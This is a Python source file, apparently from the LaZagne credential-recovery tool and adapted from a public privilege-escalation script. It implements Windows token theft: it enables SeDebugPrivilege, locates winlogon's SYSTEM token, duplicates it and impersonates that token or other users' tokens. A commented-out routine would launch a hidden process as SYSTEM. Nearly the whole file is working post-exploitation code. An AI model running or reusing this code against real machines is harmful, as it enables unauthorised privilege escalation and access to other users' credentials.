#original code from https://github.com/joren485/PyWinPrivEsc/blob/master/RunAsSystem.py
import sys, os
from ctypes import *
# import subprocess
import psutil
# import _subprocess as sub
from lazagne.config.write_output import print_debug

LPVOID = c_void_p
PVOID = LPVOID
PSID = PVOID
DWORD = c_uint32
LPSTR = c_char_p
HANDLE      = LPVOID
INVALID_HANDLE_VALUE = c_void_p(-1).value
LONG        = c_long
WORD        = c_uint16

READ_CONTROL                     = 0x00020000L
STANDARD_RIGHTS_READ             = READ_CONTROL
STANDARD_RIGHTS_REQUIRED         = 0x000F0000L

TOKEN_ASSIGN_PRIMARY    = 0x0001
TOKEN_DUPLICATE         = 0x0002
TOKEN_IMPERSONATE       = 0x0004
TOKEN_QUERY             = 0x0008
TOKEN_QUERY_SOURCE      = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS     = 0x0040
TOKEN_ADJUST_DEFAULT    = 0x0080
TOKEN_ADJUST_SESSIONID  = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
tokenprivs  = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072L | 4))
TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
        TOKEN_ADJUST_SESSIONID)

PROCESS_QUERY_INFORMATION = 0x0400

class LUID(Structure):
    _fields_ = [
        ("LowPart",     DWORD),
        ("HighPart",    LONG),
    ]

class SID_AND_ATTRIBUTES(Structure):
    _fields_ = [
        ("Sid",         PSID),
        ("Attributes",  DWORD),
    ]

class TOKEN_USER(Structure):
    _fields_ = [
        ("User", SID_AND_ATTRIBUTES),]

class LUID_AND_ATTRIBUTES(Structure):
    _fields_ = [
        ("Luid",        LUID),
        ("Attributes",  DWORD),
    ]

class TOKEN_PRIVILEGES(Structure):
    _fields_ = [
        ("PrivilegeCount",  DWORD),
        ("Privileges",      LUID_AND_ATTRIBUTES),
    ]

class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess',    HANDLE),
        ('hThread',     HANDLE),
        ('dwProcessId', DWORD),
        ('dwThreadId',  DWORD),
    ]

class STARTUPINFO(Structure):
    _fields_ = [
        ('cb',              DWORD),
        ('lpReserved',      LPSTR),
        ('lpDesktop',       LPSTR),
        ('lpTitle',         LPSTR),
        ('dwX',             DWORD),
        ('dwY',             DWORD),
        ('dwXSize',         DWORD),
        ('dwYSize',         DWORD),
        ('dwXCountChars',   DWORD),
        ('dwYCountChars',   DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags',         DWORD),
        ('wShowWindow',     WORD),
        ('cbReserved2',     WORD),
        ('lpReserved2',     LPVOID),    # LPBYTE
        ('hStdInput',       HANDLE),
        ('hStdOutput',      HANDLE),
        ('hStdError',       HANDLE),
    ]

# def GetUserName():
#     nSize = DWORD(0)
#     windll.advapi32.GetUserNameA(None, byref(nSize))
#     error = GetLastError()
    
#     ERROR_INSUFFICIENT_BUFFER = 122
#     if error != ERROR_INSUFFICIENT_BUFFER:
#         raise WinError(error)
    
#     lpBuffer = create_string_buffer('', nSize.value + 1)
    
#     success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
#     if not success:
#         raise WinError()
#     return lpBuffer.value

def GetTokenSid(hToken):
    """ Retrieve SID from Token """
    dwSize = DWORD(0)
    pStringSid = LPSTR()
    TokenUser = 1
    if windll.advapi32.GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize)) == 0:    
        address = windll.kernel32.LocalAlloc(0x0040, dwSize)
        if address:
            windll.advapi32.GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))
            pToken_User = cast(address, POINTER(TOKEN_USER))
            windll.advapi32.ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))
            if pStringSid:
                sid = pStringSid.value
                windll.kernel32.LocalFree(address)
                return sid
    return False

def EnablePrivilege(privilegeStr, hToken=None):
    """Enable Privilege on token, if no token is given the function gets the token of the current process."""
    if hToken == None:
        TOKEN_ADJUST_PRIVILEGES = 0x00000020
        TOKEN_QUERY = 0x0008
        hToken = HANDLE(INVALID_HANDLE_VALUE)
        if not hToken:
            return False
        
        hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, windll.kernel32.GetCurrentProcessId())
        if not hProcess:
            return False
        
        windll.advapi32.OpenProcessToken(hProcess, (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken))
        e = GetLastError()
        if e != 0:
            return False
        windll.kernel32.CloseHandle(hProcess)
    
    privilege_id = LUID()
    windll.advapi32.LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
    e = GetLastError()
    if e != 0:
        return False

    SE_PRIVILEGE_ENABLED = 0x00000002
    laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
    tp  = TOKEN_PRIVILEGES(1, laa)
    
    windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)  
    e = GetLastError()
    if e != 0:
        return False
    return True

def ListSids():
    sids=[]

    for proc in psutil.process_iter():
        try:
            pinfo = proc.as_dict(attrs=['pid', 'username', 'name'])
        except psutil.NoSuchProcess:
            continue
        
        if pinfo['pid']<=4:
            continue
        if pinfo['username'] is None:
            continue
        try:
            hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pinfo['pid']))
            if not hProcess:
                continue

            hToken = HANDLE(INVALID_HANDLE_VALUE)
            if not hToken:
                continue
            
            windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
            if not hToken:
                continue

            token_sid = GetTokenSid(hToken)
            if not token_sid:
                continue
            sids.append((pinfo['pid'], pinfo['name'], token_sid, pinfo['username']))

            windll.kernel32.CloseHandle(hToken)
            windll.kernel32.CloseHandle(hProcess)
        except Exception as e:
            print_debug('ERROR', str(e))

    return list(sids)

def getProcessToken(pid):
    hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
    if hProcess:
        hToken = HANDLE(INVALID_HANDLE_VALUE)
        if hToken:
            windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
            if hToken:
                windll.kernel32.CloseHandle(hProcess)
                return hToken
    return False

def getSidToken(token_sid):
    if token_sid == "S-1-5-18":
        sids = ListSids()
        for sid in sids:
            if "winlogon" in sid[1].lower():
                try:
                    hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, sid[0])
                    if hProcess:
                        hToken = HANDLE(INVALID_HANDLE_VALUE)
                        if hToken:
                            windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
                            if hToken:
                                print_debug('INFO', 'Using PID: ' + str(sid[0]))
                                windll.kernel32.CloseHandle(hProcess)
                                return hToken
                    
                    # windll.kernel32.CloseHandle(hToken)
                    windll.kernel32.CloseHandle(hProcess)
                except Exception, e :
                    print_debug('ERROR', str(e))
                    break
        return False

    pids = [int(x) for x in psutil.pids() if int(x)>4]
    for pid in pids:
        try:
            hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, int(pid))
            if hProcess:
                hToken = HANDLE(INVALID_HANDLE_VALUE)
                if hToken:
                    windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
                    if hToken:
                        if GetTokenSid( hToken ) == token_sid:
                            print
                            print_debug('INFO', 'Using PID: ' + str(pid))
                            windll.kernel32.CloseHandle(hProcess)
                            return hToken
                    windll.kernel32.CloseHandle(hToken)
            windll.kernel32.CloseHandle(hProcess)
        except Exception, e :
            print_debug('ERROR', str(e))

    return False

# def impersonate_pid(pid, close=True):
#     EnablePrivilege("SeDebugPrivilege")
#     hToken = getProcessToken(pid)
#     hTokendupe=impersonate_token(hToken)
#     if close:
#         windll.kernel32.CloseHandle(hTokendupe)
#     return hTokendupe

def impersonate_sid(sid, close=True):
    hToken = getSidToken(sid)
    if hToken:
        hTokendupe = impersonate_token(hToken)
        if hTokendupe:
            if close:
                windll.kernel32.CloseHandle(hTokendupe)
            return hTokendupe
    return False

global_ref = None
def impersonate_sid_long_handle(*args, **kwargs):
    global global_ref
    
    hTokendupe = impersonate_sid(*args, **kwargs)
    if not hTokendupe:
        return False

        if global_ref:
            windll.kernel32.CloseHandle(global_ref)

    global_ref = hTokendupe
    return addressof(hTokendupe)

# def impersonate_pid_long_handle(*args, **kwargs):
#     global global_ref
#     hTokendupe=impersonate_pid(*args, **kwargs)
#     try:
#         if global_ref is not None:
#             windll.kernel32.CloseHandle(global_ref)
#     except:
#         pass
#     global_ref=hTokendupe
#     return addressof(hTokendupe)

def impersonate_token(hToken):
    # Need admin privileges
    if EnablePrivilege("SeDebugPrivilege"):
        hTokendupe = HANDLE(INVALID_HANDLE_VALUE)
        if hTokendupe:
            SecurityImpersonation = 2
            TokenPrimary = 1
            if windll.advapi32.DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, byref(hTokendupe)):
                windll.kernel32.CloseHandle(hToken)
                if windll.advapi32.ImpersonateLoggedOnUser(hTokendupe):
                    return hTokendupe
    return False

# def create_proc_as_sid(sid, prog="cmd.exe"):
#     # if not windll.Shell32.IsUserAnAdmin():
#     #     raise OSError("You need admin rights to run getsystem !")
#     hTokendupe=impersonate_sid(sid, close=False)
#     pid=start_proc_with_token([prog], hTokendupe)
#     windll.kernel32.CloseHandle(hTokendupe)
#     return pid

# def getsystem(prog="cmd.exe"):
#     return create_proc_as_sid("S-1-5-18", prog=prog)

# def start_proc_with_token(args, hTokendupe, hidden=True):
#     ##Start the process with the token.
#     lpProcessInformation = PROCESS_INFORMATION()
#     lpStartupInfo = STARTUPINFO()
#     if hidden:
#         lpStartupInfo.dwFlags = sub.STARTF_USESHOWWINDOW | sub.CREATE_NEW_PROCESS_GROUP
#         lpStartupInfo.wShowWindow = sub.SW_HIDE
    
#     CREATE_NEW_CONSOLE = 0x00000010
#     CREATE_UNICODE_ENVIRONMENT = 0x00000400
#     NORMAL_PRIORITY_CLASS = 0x00000020
    
#     dwCreationflag = NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE

#     userenv = WinDLL('userenv', use_last_error=True)
#     userenv.CreateEnvironmentBlock.argtypes = (POINTER(c_void_p), c_void_p, c_int)
#     userenv.DestroyEnvironmentBlock.argtypes = (c_void_p,)
#     cenv = c_void_p()
    
#     success = userenv.CreateEnvironmentBlock(byref(cenv), hTokendupe, 0)
#     if not success:
#         return
    
#     success = windll.advapi32.CreateProcessAsUserA(hTokendupe, None, ' '.join(args), None, None, True, dwCreationflag, cenv, None, byref(lpStartupInfo), byref(lpProcessInformation))
#     if not success:
#        return
    
#     print_debug('INFO', 'Process created PID: ' + str(lpProcessInformation.dwProcessId))
#     return lpProcessInformation.dwProcessId

def rev2self():
    global global_ref
    windll.advapi32.RevertToSelf()
    try:
        if global_ref:
            windll.kernel32.CloseHandle(global_ref)
    except:
        pass
    global_ref = None